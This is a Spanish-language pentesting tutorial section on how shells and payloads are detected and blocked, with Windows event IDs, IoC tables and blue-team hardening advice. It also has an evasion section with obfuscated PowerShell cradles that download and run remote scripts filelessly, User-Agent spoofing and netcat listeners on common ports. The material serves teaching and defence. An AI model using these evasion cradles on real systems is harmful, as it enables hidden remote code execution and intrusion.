# Detección y Prevención de Shells y Payloads

Entender cómo los defensores detectan shells y payloads es fundamental para el pentester (para evitar ser detectado) y para el analista SOC (para detectar intrusiones). Esta sección cubre los principales indicadores de compromiso y las contramedidas defensivas.

### Cómo se detectan los payloads y shells

#### Detección basada en logs del sistema operativo

**Windows Event IDs relevantes:**

| Event ID    | Evento                                   | Por qué importa                                         |
| ----------- | ---------------------------------------- | ------------------------------------------------------- |
| `4688`      | Proceso creado (con CommandLine logging) | Detecta ejecución de payloads, reverse shells, LOLBins  |
| `4104`      | PowerShell ScriptBlock Logging           | Captura código PowerShell completo, incluyendo ofuscado |
| `4697`      | Servicio instalado                       | PsExec, Metasploit psexec crean servicios               |
| `7045`      | Nuevo servicio instalado                 | Similar a 4697, desde el System log                     |
| `4624/4625` | Logon exitoso/fallido                    | Accesos sospechosos con credenciales                    |

**Comandos de PowerShell más monitorizados:**

```powershell
IEX                          # Invoke-Expression — ejecuta código arbitrario
Invoke-Expression            # Equivalente a IEX
DownloadString               # Descarga código en memoria
DownloadFile                 # Descarga archivo al disco
Invoke-WebRequest            # Descarga HTTP
-EncodedCommand              # Comando PowerShell en Base64
-ExecutionPolicy Bypass      # Salta la política de ejecución
```

#### Detección basada en tráfico de red

```
Indicadores en tráfico:
→ Conexiones salientes a puertos inusuales (4444, 1234, 5555...)
→ Beaconing: conexiones regulares con intervalos fijos (C2)
→ Transferencias grandes de datos salientes (exfiltración)
→ User-Agents anómalos (Python-urllib, PowerShell...)
→ Conexión HTTP/S a IPs directas sin dominio
→ Tráfico SMB saliente hacia IPs externas
```

#### Detección de web shells

* Peticiones HTTP con parámetros sospechosos (`?cmd=`, `?exec=`)
* Archivos con extensiones ejecutables en directorios de uploads
* Procesos del servidor web (apache, iis) lanzando hijos como `cmd.exe`, `bash`, `sh`
* Acceso a archivos recién creados desde IPs externas

#### Detección de reverse shells

Las shells interactivas generan patrones de tráfico característicos:

* Sesión TCP persistente de larga duración
* Pequeños paquetes enviados en ambas direcciones (input/output del terminal)
* El proceso servidor web tiene conexiones de red salientes

### Técnicas de evasión (perspectiva ofensiva)

#### Ofuscación de PowerShell

```powershell
# En lugar de IEX directo:
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX(New-Object Net.WebClient).DownloadString('http://...')"))
powershell -EncodedCommand $encoded

# Usar alias menos conocidos
sal a New-Object; IEX (a Net.WebClient).DownloadString('http://...')

# Concatenación de strings
$c = 'Invoke' + '-' + 'Expression'
& $c (New-Object Net.WebClient).DownloadString('http://...')
```

#### Usar puertos comunes para las shells

```bash
# En lugar de 4444 (muy detectado), usar:
nc -lvnp 443     # HTTPS — raramente bloqueado saliente
nc -lvnp 80      # HTTP — raramente bloqueado saliente
nc -lvnp 8080    # HTTP alternativo — común
```

#### Fileless execution

Ejecutar código directamente en memoria sin tocar el disco:

```powershell
# El payload nunca se escribe en el disco
IEX (New-Object Net.WebClient).DownloadString('http://servidor/script.ps1')
```

#### Cambiar el User-Agent

```powershell
$wc = New-Object Net.WebClient
$wc.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
IEX $wc.DownloadString('http://...')
```

### Medidas defensivas (perspectiva Blue Team)

#### Configuración de Windows

**Habilitar Command Line Logging (Event ID 4688):**

```
Group Policy → Administrative Templates → System → Audit Process Creation
→ Include command line in process creation events: Enabled
```

**Habilitar PowerShell Script Block Logging (Event ID 4104):**

```
Group Policy → Administrative Templates → Windows Components → Windows PowerShell
→ Turn on PowerShell Script Block Logging: Enabled
```

**PowerShell Constrained Language Mode:** Limita las capacidades de PowerShell para usuarios no administradores, bloqueando muchas técnicas de ataque.

#### AppLocker / WDAC

Políticas de control de aplicaciones que permiten solo ejecutar binarios firmados y de confianza. Bloquean la mayoría de payloads no firmados y muchos LOLBins.

#### Controles de red

* Bloquear conexiones salientes desde servidores web a internet (solo permitir lo necesario)
* IDS/IPS con reglas para detectar tráfico de C2 conocido
* Proxy de inspección SSL para ver tráfico HTTPS
* Segmentación de red — los servidores web no deben poder alcanzar la red interna directamente

#### Para web shells específicamente

* Configurar el servidor web para que los directorios de uploads no ejecuten código (solo servir archivos estáticos)
* Validar el tipo de archivo tanto en el cliente como en el servidor
* Usar un WAF (Web Application Firewall) que detecte peticiones sospechosas
* Monitorizar la creación de nuevos archivos en los directorios web

#### File Integrity Monitoring (FIM)

Herramientas como **Wazuh**, **OSSEC** o **Tripwire** monitorizan cambios en archivos del sistema. Una web shell subida al servidor genera una alerta de "nuevo archivo creado" en el directorio web.

### Referencia rápida — Indicadores de Compromiso (IoCs)

| IoC                                     | Tipo              | Indicador de                   |
| --------------------------------------- | ----------------- | ------------------------------ |
| `powershell.exe -enc ...`               | Proceso           | Payload PowerShell ofuscado    |
| `cmd.exe` hijo de `w3wp.exe`            | Árbol de procesos | Web shell en IIS               |
| `bash` hijo de `apache`                 | Árbol de procesos | Web shell en Linux             |
| Archivo `.php` en `/uploads/`           | Archivo           | Web shell PHP subida           |
| Conexión TCP persistente desde `apache` | Red               | Reverse shell activa           |
| `nc.exe` o `ncat.exe` en `C:\Temp\`     | Archivo           | Netcat subido al sistema       |
| Evento 4688: `certutil -urlcache`       | Log Windows       | Descarga de payload via LOLBin |
| Evento 4104: `IEX` + `DownloadString`   | Log PowerShell    | Payload fileless en memoria    |

> La defensa más efectiva es la **detección basada en comportamiento**, no en firmas. Un proceso web ejecutando comandos del sistema es sospechoso independientemente de qué herramienta específica se use.

> Como pentester, es responsabilidad documentar todas las shells y payloads desplegados durante el engagement y eliminarlos al finalizar. Cualquier acceso persistente dejado activo representa un riesgo real para el cliente.
